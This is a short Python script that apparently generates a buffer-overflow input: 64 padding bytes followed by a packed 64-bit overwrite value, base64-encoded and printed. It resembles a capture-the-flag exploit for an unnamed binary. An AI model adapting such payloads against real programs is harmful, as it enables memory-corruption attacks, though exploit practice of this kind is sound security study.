
import sys
import struct
import base64

buf = b'nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
buf += struct.pack('<Q', 14219007200801584859)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
